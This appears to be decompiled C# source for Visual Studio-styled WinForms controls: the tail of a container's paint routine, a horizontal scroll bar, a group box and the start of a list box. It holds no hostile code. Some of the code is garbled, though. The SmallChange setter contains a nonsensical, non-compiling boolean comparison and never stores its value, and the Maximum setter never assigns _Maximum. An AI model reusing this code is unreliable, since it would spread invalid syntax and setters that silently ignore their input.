			Graphics graphics2 = graphics;
			graphics2.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
			graphics2.SmoothingMode = SmoothingMode.AntiAlias;
			graphics2.PixelOffsetMode = PixelOffsetMode.HighQuality;
			Graphics arg_45_0 = graphics2;
			Brush arg_45_1 = new SolidBrush(this._BaseColour);
			Rectangle rectangle = new Rectangle(0, 0, this.Width, this.Height);
			arg_45_0.FillRectangle(arg_45_1, rectangle);
			Graphics arg_6E_0 = graphics2;
			Pen arg_6E_1 = new Pen(this._BorderColour);
			rectangle = new Rectangle(0, 0, this.Width, this.Height);
			arg_6E_0.DrawRectangle(arg_6E_1, rectangle);
			MouseState state = this.State;
			bool flag = state == MouseState.Over;
			checked
			{
				bool flag2;
				if (flag)
				{
					flag2 = (this.MouseXLoc > this.Width - 30 && this.MouseXLoc < this.Width && this.MouseYLoc < 26);
					if (flag2)
					{
						Graphics arg_E0_0 = graphics2;
						Brush arg_E0_1 = new SolidBrush(this._HoverColour);
						rectangle = new Rectangle(this.Width - 30, 1, 29, 25);
						arg_E0_0.FillRectangle(arg_E0_1, rectangle);
					}
					else
					{
						flag2 = (this.MouseXLoc > this.Width - 60 && this.MouseXLoc < this.Width - 30 && this.MouseYLoc < 26);
						if (flag2)
						{
							Graphics arg_144_0 = graphics2;
							Brush arg_144_1 = new SolidBrush(this._HoverColour);
							rectangle = new Rectangle(this.Width - 60, 1, 30, 25);
							arg_144_0.FillRectangle(arg_144_1, rectangle);
						}
						else
						{
							flag2 = (this.MouseXLoc > this.Width - 90 && this.MouseXLoc < this.Width - 60 && this.MouseYLoc < 26);
							if (flag2)
							{
								Graphics arg_1A5_0 = graphics2;
								Brush arg_1A5_1 = new SolidBrush(this._HoverColour);
								rectangle = new Rectangle(this.Width - 90, 1, 30, 25);
								arg_1A5_0.FillRectangle(arg_1A5_1, rectangle);
							}
						}
					}
				}
				graphics2.DrawLine(new Pen(this._ControlBoxColours, 2f), this.Width - 20, 10, this.Width - 12, 18);
				graphics2.DrawLine(new Pen(this._ControlBoxColours, 2f), this.Width - 20, 18, this.Width - 12, 10);
				graphics2.FillRectangle(new SolidBrush(this._ControlBoxColours), this.Width - 79, 17, 8, 2);
				flag2 = (this.FindForm().WindowState == FormWindowState.Normal);
				if (flag2)
				{
					graphics2.DrawLine(new Pen(this._ControlBoxColours), this.Width - 49, 18, this.Width - 40, 18);
					graphics2.DrawLine(new Pen(this._ControlBoxColours), this.Width - 49, 18, this.Width - 49, 10);
					graphics2.DrawLine(new Pen(this._ControlBoxColours), this.Width - 40, 18, this.Width - 40, 10);
					graphics2.DrawLine(new Pen(this._ControlBoxColours), this.Width - 49, 10, this.Width - 40, 10);
					graphics2.DrawLine(new Pen(this._ControlBoxColours), this.Width - 49, 11, this.Width - 40, 11);
				}
				else
				{
					flag2 = (this.FindForm().WindowState == FormWindowState.Maximized);
					if (flag2)
					{
						graphics2.DrawLine(new Pen(this._ControlBoxColours), this.Width - 48, 16, this.Width - 39, 16);
						graphics2.DrawLine(new Pen(this._ControlBoxColours), this.Width - 48, 16, this.Width - 48, 8);
						graphics2.DrawLine(new Pen(this._ControlBoxColours), this.Width - 39, 16, this.Width - 39, 8);
						graphics2.DrawLine(new Pen(this._ControlBoxColours), this.Width - 48, 8, this.Width - 39, 8);
						graphics2.DrawLine(new Pen(this._ControlBoxColours), this.Width - 48, 9, this.Width - 39, 9);
						Graphics arg_408_0 = graphics2;
						Brush arg_408_1 = new SolidBrush(this._BaseColour);
						rectangle = new Rectangle(this.Width - 51, 12, 9, 8);
						arg_408_0.FillRectangle(arg_408_1, rectangle);
						graphics2.DrawLine(new Pen(this._ControlBoxColours), this.Width - 51, 20, this.Width - 42, 20);
						graphics2.DrawLine(new Pen(this._ControlBoxColours), this.Width - 51, 20, this.Width - 51, 12);
						graphics2.DrawLine(new Pen(this._ControlBoxColours), this.Width - 42, 20, this.Width - 42, 12);
						graphics2.DrawLine(new Pen(this._ControlBoxColours), this.Width - 51, 12, this.Width - 42, 12);
						graphics2.DrawLine(new Pen(this._ControlBoxColours), this.Width - 51, 13, this.Width - 42, 13);
					}
				}
				flag2 = this._ShowIcon;
				if (flag2)
				{
					VisualStudioContainer.__IconStyle iconStyle = this._IconStyle;
					flag = (iconStyle == VisualStudioContainer.__IconStyle.FormIcon);
					if (flag)
					{
						Graphics arg_519_0 = graphics2;
						Icon arg_519_1 = this.FindForm().Icon;
						rectangle = new Rectangle(6, 6, 22, 22);
						arg_519_0.DrawIcon(arg_519_1, rectangle);
						Graphics arg_575_0 = graphics2;
						string arg_575_1 = this.Text;
						Font arg_575_2 = this._Font;
						Brush arg_575_3 = new SolidBrush(this._FontColour);
						RectangleF layoutRectangle = new RectangleF(37f, 0f, (float)(this.Width - 110), 32f);
						arg_575_0.DrawString(arg_575_1, arg_575_2, arg_575_3, layoutRectangle, new StringFormat
						{
							LineAlignment = StringAlignment.Center,
							Alignment = StringAlignment.Near
						});
					}
					else
					{
						graphics2.DrawLines(new Pen(this._IconColour, 3f), this.Points1);
						graphics2.DrawLines(new Pen(this._IconColour, 3f), this.Points2);
						graphics2.DrawLines(new Pen(this._IconColour, 4f), this.Points3);
						graphics2.DrawLines(new Pen(this._IconColour, 4f), this.Points4);
						Graphics arg_622_0 = graphics2;
						Pen arg_622_1 = new Pen(this._IconColour, 3f);
						Point point = new Point(9, 11);
						Point arg_622_2 = point;
						Point pt = new Point(9, 22);
						arg_622_0.DrawLine(arg_622_1, arg_622_2, pt);
						graphics2.DrawLine(new Pen(this._IconColour, 4f), 26, 6, 26, 28);
						Graphics arg_69C_0 = graphics2;
						string arg_69C_1 = this.Text;
						Font arg_69C_2 = this._Font;
						Brush arg_69C_3 = new SolidBrush(this._FontColour);
						RectangleF layoutRectangle = new RectangleF(37f, 0f, (float)(this.Width - 110), 32f);
						arg_69C_0.DrawString(arg_69C_1, arg_69C_2, arg_69C_3, layoutRectangle, new StringFormat
						{
							LineAlignment = StringAlignment.Center,
							Alignment = StringAlignment.Near
						});
					}
				}
				else
				{
					Graphics arg_6FC_0 = graphics2;
					string arg_6FC_1 = this.Text;
					Font arg_6FC_2 = this._Font;
					Brush arg_6FC_3 = new SolidBrush(this._FontColour);
					RectangleF layoutRectangle = new RectangleF(5f, 0f, (float)(this.Width - 110), 30f);
					arg_6FC_0.DrawString(arg_6FC_1, arg_6FC_2, arg_6FC_3, layoutRectangle, new StringFormat
					{
						LineAlignment = StringAlignment.Center,
						Alignment = StringAlignment.Near
					});
				}
				graphics2.InterpolationMode = InterpolationMode.HighQualityBicubic;
			}
		}
	}
}

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	public class VisualStudioHorizontalScrollBar : Control
	{
		public enum __InnerLineCount
		{
			None,
			One,
			Two,
			Three
		}

		public delegate void ScrollEventHandler(object sender);

		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private Color _BaseColour;

		private Color _ThumbNormalColour;

		private Color _ThumbHoverColour;

		private Color _ThumbPressedColour;

		private Color _ArrowNormalColour;

		private Color _ArrowHoveerColour;

		private Color _ArrowPressedColour;

		private Color _OuterBorderColour;

		private Color _ThumbBorderColour;

		private int _Minimum;

		private int _Maximum;

		private int _Value;

		private int _SmallChange;

		private int _ButtonSize;

		private int _LargeChange;

		private bool _ShowOuterBorder;

		private bool _ShowThumbBorder;

		private VisualStudioHorizontalScrollBar.__InnerLineCount _AmountOfInnerLines;

		private Point _MousePos;

		private MouseState _ThumbState;

		private MouseState _ArrowState;

		private int _MouseXLoc;

		private int _MouseYLoc;

		private int ThumbMovement;

		private Rectangle LSA;

		private Rectangle RSA;

		private Rectangle Shaft;

		private Rectangle Thumb;

		private bool ShowThumb;

		private bool ThumbPressed;

		private int _ThumbSize;

		private VisualStudioHorizontalScrollBar.ScrollEventHandler ScrollEvent;

		public event VisualStudioHorizontalScrollBar.ScrollEventHandler Scroll
		{
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				this.ScrollEvent = (VisualStudioHorizontalScrollBar.ScrollEventHandler)Delegate.Combine(this.ScrollEvent, value);
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				this.ScrollEvent = (VisualStudioHorizontalScrollBar.ScrollEventHandler)Delegate.Remove(this.ScrollEvent, value);
			}
		}

		[Category("Colours")]
		public Color BaseColour
		{
			get
			{
				return this._BaseColour;
			}
			set
			{
				this._BaseColour = value;
			}
		}

		[Category("Colours")]
		public Color ThumbNormalColour
		{
			get
			{
				return this._ThumbNormalColour;
			}
			set
			{
				this._ThumbNormalColour = value;
			}
		}

		[Category("Colours")]
		public Color ThumbHoverColour
		{
			get
			{
				return this._ThumbHoverColour;
			}
			set
			{
				this._ThumbHoverColour = value;
			}
		}

		[Category("Colours")]
		public Color ThumbPressedColour
		{
			get
			{
				return this._ThumbPressedColour;
			}
			set
			{
				this._ThumbPressedColour = value;
			}
		}

		[Category("Colours")]
		public Color ArrowNormalColour
		{
			get
			{
				return this._ArrowNormalColour;
			}
			set
			{
				this._ArrowNormalColour = value;
			}
		}

		[Category("Colours")]
		public Color ArrowHoveerColour
		{
			get
			{
				return this._ArrowHoveerColour;
			}
			set
			{
				this._ArrowHoveerColour = value;
			}
		}

		[Category("Colours")]
		public Color ArrowPressedColour
		{
			get
			{
				return this._ArrowPressedColour;
			}
			set
			{
				this._ArrowPressedColour = value;
			}
		}

		[Category("Colours")]
		public Color OuterBorderColour
		{
			get
			{
				return this._OuterBorderColour;
			}
			set
			{
				this._OuterBorderColour = value;
			}
		}

		[Category("Colours")]
		public Color ThumbBorderColour
		{
			get
			{
				return this._ThumbBorderColour;
			}
			set
			{
				this._ThumbBorderColour = value;
			}
		}

		[Category("Control")]
		public int Minimum
		{
			get
			{
				return this._Minimum;
			}
			set
			{
				this._Minimum = value;
				bool flag = value > this._Value;
				if (flag)
				{
					this._Value = value;
				}
				flag = (value > this._Maximum);
				if (flag)
				{
					this._Maximum = value;
				}
				this.InvalidateLayout();
			}
		}

		[Category("Control")]
		public int Maximum
		{
			get
			{
				return this._Maximum;
			}
			set
			{
				bool flag = value < this._Value;
				if (flag)
				{
					this._Value = value;
				}
				flag = (value < this._Minimum);
				if (flag)
				{
					this._Minimum = value;
				}
				this.InvalidateLayout();
			}
		}

		[Category("Control")]
		public int Value
		{
			get
			{
				return this._Value;
			}
			set
			{
				bool flag = value == this._Value;
				if (!flag)
				{
					flag = (value < this._Minimum);
					if (flag)
					{
						this._Value = this._Minimum;
					}
					else
					{
						flag = (value > this._Maximum);
						if (flag)
						{
							this._Value = this._Maximum;
						}
						else
						{
							this._Value = value;
						}
					}
					this.InvalidatePosition();
					VisualStudioHorizontalScrollBar.ScrollEventHandler scrollEvent = this.ScrollEvent;
					flag = (scrollEvent != null);
					if (flag)
					{
						scrollEvent(this);
					}
				}
			}
		}

		[Category("Control")]
		public int SmallChange
		{
			get
			{
				return this._SmallChange;
			}
			set
			{
				bool flag = value < 1;
				if (!flag)
				{
					flag = (value > ((-(((this._SmallChange == value) > false) ? 1 : 0)) ? 1 : 0));
					if (flag)
					{
					}
				}
			}
		}

		[Category("Control")]
		public int LargeChange
		{
			get
			{
				return this._LargeChange;
			}
			set
			{
				bool flag = value < 1;
				if (!flag)
				{
					this._LargeChange = value;
				}
			}
		}

		[Category("Control")]
		public int ButtonSize
		{
			get
			{
				return this._ButtonSize;
			}
			set
			{
				bool flag = value < 16;
				if (flag)
				{
					this._ButtonSize = 16;
				}
				else
				{
					this._ButtonSize = value;
				}
			}
		}

		[Category("Control")]
		public bool ShowOuterBorder
		{
			get
			{
				return this._ShowOuterBorder;
			}
			set
			{
				this._ShowOuterBorder = value;
				this.Invalidate();
			}
		}

		[Category("Control")]
		public bool ShowThumbBorder
		{
			get
			{
				return this._ShowThumbBorder;
			}
			set
			{
				this._ShowThumbBorder = value;
				this.Invalidate();
			}
		}

		[Category("Control")]
		public VisualStudioHorizontalScrollBar.__InnerLineCount AmountOfInnerLines
		{
			get
			{
				return this._AmountOfInnerLines;
			}
			set
			{
				this._AmountOfInnerLines = value;
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = VisualStudioHorizontalScrollBar.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = VisualStudioHorizontalScrollBar.__ENCList.Count == VisualStudioHorizontalScrollBar.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = VisualStudioHorizontalScrollBar.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = VisualStudioHorizontalScrollBar.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									VisualStudioHorizontalScrollBar.__ENCList[num] = VisualStudioHorizontalScrollBar.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						VisualStudioHorizontalScrollBar.__ENCList.RemoveRange(num, VisualStudioHorizontalScrollBar.__ENCList.Count - num);
						VisualStudioHorizontalScrollBar.__ENCList.Capacity = VisualStudioHorizontalScrollBar.__ENCList.Count;
					}
					VisualStudioHorizontalScrollBar.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		protected override void OnSizeChanged(EventArgs e)
		{
			this.InvalidateLayout();
		}

		private void InvalidateLayout()
		{
			this.LSA = new Rectangle(0, 0, 16, this.Height);
			checked
			{
				this.RSA = new Rectangle(this.Width - this.ButtonSize, 0, this.ButtonSize, this.Height);
				this.Shaft = new Rectangle(this.LSA.Right + 1, 0, (int)Math.Round(unchecked((double)this.Width - (double)this.Width / 8.0 - 8.0)), this.Height);
				this.ShowThumb = (this._Maximum - this._Minimum != 0);
				bool flag = this.ShowThumb;
				if (flag)
				{
					this.Thumb = new Rectangle(0, 4, (int)Math.Round((double)this.Width / 8.0), this.Height - 8);
				}
				VisualStudioHorizontalScrollBar.ScrollEventHandler scrollEvent = this.ScrollEvent;
				flag = (scrollEvent != null);
				if (flag)
				{
					scrollEvent(this);
				}
				this.InvalidatePosition();
			}
		}

		private void InvalidatePosition()
		{
			this.Thumb.X = checked((int)Math.Round(unchecked(checked((double)(this._Value - this._Minimum) / (double)(this._Maximum - this._Minimum)) * (double)(checked(this.Shaft.Width - this._ThumbSize)) + 16.0)));
			this.Invalidate();
		}

		protected override void OnMouseDown(MouseEventArgs e)
		{
			bool flag = e.Button == MouseButtons.Left && this.ShowThumb;
			checked
			{
				if (flag)
				{
					bool flag2 = this.LSA.Contains(e.Location);
					if (flag2)
					{
						this._ArrowState = MouseState.Down;
						this.ThumbMovement = this._Value - this._SmallChange;
					}
					else
					{
						flag2 = this.RSA.Contains(e.Location);
						if (flag2)
						{
							this.ThumbMovement = this._Value + this._SmallChange;
							this._ArrowState = MouseState.Down;
						}
						else
						{
							flag2 = this.Thumb.Contains(e.Location);
							if (flag2)
							{
								this._ThumbState = MouseState.Down;
								this.Invalidate();
								return;
							}
							flag2 = (e.X < this.Thumb.X);
							if (flag2)
							{
								this.ThumbMovement = this._Value - this._LargeChange;
							}
							else
							{
								this.ThumbMovement = this._Value + this._LargeChange;
							}
						}
					}
					this.Value = Math.Min(Math.Max(this.ThumbMovement, this._Minimum), this._Maximum);
					this.Invalidate();
					this.InvalidatePosition();
				}
			}
		}

		protected override void OnMouseMove(MouseEventArgs e)
		{
			this._MouseXLoc = e.Location.X;
			this._MouseYLoc = e.Location.Y;
			bool flag = this.LSA.Contains(e.Location);
			if (flag)
			{
				this._ArrowState = MouseState.Over;
			}
			else
			{
				flag = this.RSA.Contains(e.Location);
				if (flag)
				{
					this._ArrowState = MouseState.Over;
				}
				else
				{
					flag = (this._ArrowState != MouseState.Down);
					if (flag)
					{
						this._ArrowState = MouseState.None;
					}
				}
			}
			flag = (this.Thumb.Contains(e.Location) & this._ThumbState != MouseState.Down);
			if (flag)
			{
				this._ThumbState = MouseState.Over;
			}
			else
			{
				flag = (this._ThumbState != MouseState.Down);
				if (flag)
				{
					this._ThumbState = MouseState.None;
				}
			}
			this.Invalidate();
			flag = (this._ThumbState == MouseState.Down | (this._ArrowState == MouseState.Down && this.ShowThumb));
			checked
			{
				if (flag)
				{
					int num = e.X + 2 - this.LSA.Width - this._ThumbSize / 2;
					int num2 = this.Shaft.Width - this._ThumbSize;
					this.ThumbMovement = (int)Math.Round(unchecked((double)num / (double)num2 * (double)(checked(this._Maximum - this._Minimum)))) - this._Minimum;
					this.Value = Math.Min(Math.Max(this.ThumbMovement, this._Minimum), this._Maximum);
					this.InvalidatePosition();
				}
			}
		}

		protected override void OnMouseUp(MouseEventArgs e)
		{
			bool flag = this.Thumb.Contains(e.Location);
			if (flag)
			{
				this._ThumbState = MouseState.Over;
			}
			else
			{
				flag = !this.Thumb.Contains(e.Location);
				if (flag)
				{
					this._ThumbState = MouseState.None;
				}
			}
			checked
			{
				flag = (e.Location.X < 16 | e.Location.X > this.Width - 16);
				if (flag)
				{
					this._ThumbState = MouseState.Over;
				}
				else
				{
					flag = (e.Location.X >= 16 | e.Location.X > this.Width - 16);
					if (flag)
					{
						this._ThumbState = MouseState.None;
					}
				}
				this.Invalidate();
			}
		}

		protected override void OnMouseLeave(EventArgs e)
		{
			this._ThumbState = MouseState.None;
			this._ArrowState = MouseState.None;
			this.Invalidate();
		}

		protected override void OnMouseEnter(EventArgs e)
		{
			base.OnMouseEnter(e);
			this.Invalidate();
		}

		public VisualStudioHorizontalScrollBar()
		{
			VisualStudioHorizontalScrollBar.__ENCAddToList(this);
			this._BaseColour = Color.FromArgb(62, 62, 66);
			this._ThumbNormalColour = Color.FromArgb(104, 104, 104);
			this._ThumbHoverColour = Color.FromArgb(158, 158, 158);
			this._ThumbPressedColour = Color.FromArgb(239, 235, 239);
			this._ArrowNormalColour = Color.FromArgb(153, 153, 153);
			this._ArrowHoveerColour = Color.FromArgb(39, 123, 181);
			this._ArrowPressedColour = Color.FromArgb(0, 113, 171);
			this._Minimum = 0;
			this._Maximum = 100;
			this._Value = 0;
			this._SmallChange = 1;
			this._ButtonSize = 16;
			this._LargeChange = 10;
			this._ShowOuterBorder = false;
			this._ShowThumbBorder = false;
			this._AmountOfInnerLines = VisualStudioHorizontalScrollBar.__InnerLineCount.None;
			this._MousePos = new Point(this._MouseXLoc, this._MouseYLoc);
			this._ThumbState = MouseState.None;
			this._ArrowState = MouseState.None;
			this._ThumbSize = 24;
			this.SetStyle(ControlStyles.UserPaint | ControlStyles.ResizeRedraw | ControlStyles.Selectable | ControlStyles.SupportsTransparentBackColor | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
			this.DoubleBuffered = true;
			Size size = new Size(50, 19);
			this.Size = size;
		}

		protected override void OnPaint(PaintEventArgs e)
		{
			Graphics graphics = e.Graphics;
			Graphics graphics2 = graphics;
			graphics2.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
			graphics2.SmoothingMode = SmoothingMode.HighQuality;
			graphics2.PixelOffsetMode = PixelOffsetMode.HighQuality;
			graphics2.Clear(this._BaseColour);
			Point[] array = new Point[3];
			Point[] arg_66_0_cp_0 = array;
			int arg_66_0_cp_1 = 0;
			checked
			{
				Point point = new Point(5, (int)Math.Round((double)this.Height / 2.0));
				arg_66_0_cp_0[arg_66_0_cp_1] = point;
				Point[] arg_96_0_cp_0 = array;
				int arg_96_0_cp_1 = 1;
				Point point2 = new Point(11, (int)Math.Round((double)this.Height / 4.0));
				arg_96_0_cp_0[arg_96_0_cp_1] = point2;
				Point[] arg_D8_0_cp_0 = array;
				int arg_D8_0_cp_1 = 2;
				Point point3 = new Point(11, (int)Math.Round(unchecked((double)this.Height / 2.0 + (double)this.Height / 4.0)));
				arg_D8_0_cp_0[arg_D8_0_cp_1] = point3;
				Point[] points = array;
				array = new Point[3];
				Point[] arg_119_0_cp_0 = array;
				int arg_119_0_cp_1 = 0;
				point3 = new Point(this.Width - 5, (int)Math.Round((double)this.Height / 2.0));
				arg_119_0_cp_0[arg_119_0_cp_1] = point3;
				Point[] arg_150_0_cp_0 = array;
				int arg_150_0_cp_1 = 1;
				point2 = new Point(this.Width - 11, (int)Math.Round((double)this.Height / 4.0));
				arg_150_0_cp_0[arg_150_0_cp_1] = point2;
				Point[] arg_199_0_cp_0 = array;
				int arg_199_0_cp_1 = 2;
				point = new Point(this.Width - 11, (int)Math.Round(unchecked((double)this.Height / 2.0 + (double)this.Height / 4.0)));
				arg_199_0_cp_0[arg_199_0_cp_1] = point;
				Point[] points2 = array;
				switch (this._ThumbState)
				{
				case MouseState.None:
				{
					SolidBrush solidBrush = new SolidBrush(this._ThumbNormalColour);
					try
					{
						graphics2.FillRectangle(solidBrush, this.Thumb);
					}
					finally
					{
						bool flag = solidBrush != null;
						if (flag)
						{
							((IDisposable)solidBrush).Dispose();
						}
					}
					break;
				}
				case MouseState.Over:
				{
					SolidBrush solidBrush2 = new SolidBrush(this._ThumbHoverColour);
					try
					{
						graphics2.FillRectangle(solidBrush2, this.Thumb);
					}
					finally
					{
						bool flag = solidBrush2 != null;
						if (flag)
						{
							((IDisposable)solidBrush2).Dispose();
						}
					}
					break;
				}
				case MouseState.Down:
				{
					SolidBrush solidBrush3 = new SolidBrush(this._ThumbPressedColour);
					try
					{
						graphics2.FillRectangle(solidBrush3, this.Thumb);
					}
					finally
					{
						bool flag = solidBrush3 != null;
						if (flag)
						{
							((IDisposable)solidBrush3).Dispose();
						}
					}
					break;
				}
				}
				switch (this._ArrowState)
				{
				case MouseState.None:
					graphics2.FillPolygon(new SolidBrush(this._ArrowNormalColour), points);
					graphics2.FillPolygon(new SolidBrush(this._ArrowNormalColour), points2);
					break;
				case MouseState.Over:
				{
					bool flag = this._MouseXLoc < 16;
					if (flag)
					{
						graphics2.FillPolygon(new SolidBrush(this._ArrowHoveerColour), points);
						graphics2.FillPolygon(new SolidBrush(this._ArrowNormalColour), points2);
					}
					else
					{
						flag = (this._MouseXLoc > this.Width - 16);
						if (flag)
						{
							graphics2.FillPolygon(new SolidBrush(this._ArrowHoveerColour), points2);
							graphics2.FillPolygon(new SolidBrush(this._ArrowNormalColour), points);
						}
						else
						{
							graphics2.FillPolygon(new SolidBrush(this._ArrowNormalColour), points);
							graphics2.FillPolygon(new SolidBrush(this._ArrowNormalColour), points2);
						}
					}
					break;
				}
				case MouseState.Down:
				{
					bool flag = !this.Thumb.Contains(this._MousePos);
					if (flag)
					{
						SolidBrush solidBrush4 = new SolidBrush(this._ThumbNormalColour);
						try
						{
							graphics2.FillRectangle(solidBrush4, this.Thumb);
						}
						finally
						{
							flag = (solidBrush4 != null);
							if (flag)
							{
								((IDisposable)solidBrush4).Dispose();
							}
						}
					}
					flag = (this._MouseXLoc < 16);
					if (flag)
					{
						graphics2.FillPolygon(new SolidBrush(this._ArrowPressedColour), points);
						graphics2.FillPolygon(new SolidBrush(this._ArrowNormalColour), points2);
					}
					else
					{
						flag = (this._MouseXLoc > this.Width - 16);
						if (flag)
						{
							graphics2.FillPolygon(new SolidBrush(this._ArrowPressedColour), points2);
							graphics2.FillPolygon(new SolidBrush(this._ArrowNormalColour), points);
						}
						else
						{
							graphics2.FillPolygon(new SolidBrush(this._ArrowNormalColour), points);
							graphics2.FillPolygon(new SolidBrush(this._ArrowNormalColour), points2);
						}
					}
					break;
				}
				}
				graphics2.InterpolationMode = InterpolationMode.HighQualityBicubic;
				graphics2 = null;
			}
		}
	}
}

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	public class VisualStudioGroupBox : ContainerControl
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private Color _MainColour;

		private Color _HeaderColour;

		private Color _TextColour;

		private Color _BorderColour;

		[Category("Colours")]
		public Color BorderColour
		{
			get
			{
				return this._BorderColour;
			}
			set
			{
				this._BorderColour = value;
			}
		}

		[Category("Colours")]
		public Color TextColour
		{
			get
			{
				return this._TextColour;
			}
			set
			{
				this._TextColour = value;
			}
		}

		[Category("Colours")]
		public Color HeaderColour
		{
			get
			{
				return this._HeaderColour;
			}
			set
			{
				this._HeaderColour = value;
			}
		}

		[Category("Colours")]
		public Color MainColour
		{
			get
			{
				return this._MainColour;
			}
			set
			{
				this._MainColour = value;
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = VisualStudioGroupBox.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = VisualStudioGroupBox.__ENCList.Count == VisualStudioGroupBox.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = VisualStudioGroupBox.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = VisualStudioGroupBox.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									VisualStudioGroupBox.__ENCList[num] = VisualStudioGroupBox.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						VisualStudioGroupBox.__ENCList.RemoveRange(num, VisualStudioGroupBox.__ENCList.Count - num);
						VisualStudioGroupBox.__ENCList.Capacity = VisualStudioGroupBox.__ENCList.Count;
					}
					VisualStudioGroupBox.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		public VisualStudioGroupBox()
		{
			VisualStudioGroupBox.__ENCAddToList(this);
			this._MainColour = Color.FromArgb(37, 37, 38);
			this._HeaderColour = Color.FromArgb(45, 45, 48);
			this._TextColour = Color.FromArgb(129, 129, 131);
			this._BorderColour = Color.FromArgb(2, 118, 196);
			this.SetStyle(ControlStyles.UserPaint | ControlStyles.ResizeRedraw | ControlStyles.SupportsTransparentBackColor | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
			this.DoubleBuffered = true;
			Size size = new Size(160, 110);
			this.Size = size;
			this.Font = new Font("Segoe UI", 10f, FontStyle.Regular);
		}

		protected override void OnPaint(PaintEventArgs e)
		{
			Graphics graphics = e.Graphics;
			Graphics graphics2 = graphics;
			graphics2.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
			graphics2.SmoothingMode = SmoothingMode.HighQuality;
			graphics2.PixelOffsetMode = PixelOffsetMode.HighQuality;
			Graphics arg_46_0 = graphics2;
			Brush arg_46_1 = new SolidBrush(this._MainColour);
			Rectangle rect = new Rectangle(0, 28, this.Width, this.Height);
			arg_46_0.FillRectangle(arg_46_1, rect);
			Graphics arg_6B_0 = graphics2;
			Brush arg_6B_1 = new SolidBrush(this._HeaderColour);
			rect = new Rectangle(0, 0, this.Width, 28);
			arg_6B_0.FillRectangle(arg_6B_1, rect);
			Graphics arg_95_0 = graphics2;
			Brush arg_95_1 = new SolidBrush(Color.FromArgb(33, 33, 33));
			rect = new Rectangle(0, 28, this.Width, 1);
			arg_95_0.FillRectangle(arg_95_1, rect);
			Graphics arg_C3_0 = graphics2;
			string arg_C3_1 = this.Text;
			Font arg_C3_2 = this.Font;
			Brush arg_C3_3 = new SolidBrush(this._TextColour);
			Point p = new Point(5, 5);
			arg_C3_0.DrawString(arg_C3_1, arg_C3_2, arg_C3_3, p);
			Graphics arg_F1_0 = graphics2;
			Pen arg_F1_1 = new Pen(this._BorderColour, 2f);
			rect = new Rectangle(0, 0, this.Width, this.Height);
			arg_F1_0.DrawRectangle(arg_F1_1, rect);
			graphics2.InterpolationMode = InterpolationMode.HighQualityBicubic;
		}
	}
}

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	public class VisualStudioListBoxWBuiltInScrollBar : Control
	{
		public class VSListBoxItem
		{
			[DebuggerBrowsable(DebuggerBrowsableState.Never), CompilerGenerated]
			private string _Text;

			public string Text
			{
				[DebuggerNonUserCode]
				get
				{
					return this._Text;
				}
				[DebuggerNonUserCode]
				set
				{
					this._Text = value;
				}
			}

			[DebuggerNonUserCode]
			public VSListBoxItem()
			{
			}

			public override string ToString()
			{
				return this.Text;
			}
		}

		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private List<VisualStudioListBoxWBuiltInScrollBar.VSListBoxItem> _Items;

		private readonly List<VisualStudioListBoxWBuiltInScrollBar.VSListBoxItem> _SelectedItems;

		private bool _MultiSelect;

		private int ItemHeight;

		private VisualStudioVerticalScrollBar VerticalScrollbar;

		private Color _BaseColour;

		private Color _NonSelectedItemColour;

		private Color _SelectedItemColour;

		private Color _BorderColour;

		private Color _FontColour;

		private int _SelectedWidth;

		private int _SelectedHeight;

		private bool _DontShowInnerScrollbarBorder;

		private bool _ShowWholeInnerBorder;

		[Category("Colours")]
		public Color FontColour
		{
			get
			{
				return this._FontColour;
			}
			set
			{
				this._FontColour = value;
			}
		}

		[Category("Colours")]
		public Color BaseColour
		{
			get
			{
				return this._BaseColour;
			}
			set
			{
				this._BaseColour = value;
			}
		}

		[Category("Colours")]
		public Color SelectedItemColour
		{
			get
			{
				return this._SelectedItemColour;
			}
			set
			{
				this._SelectedItemColour = value;
			}
		}

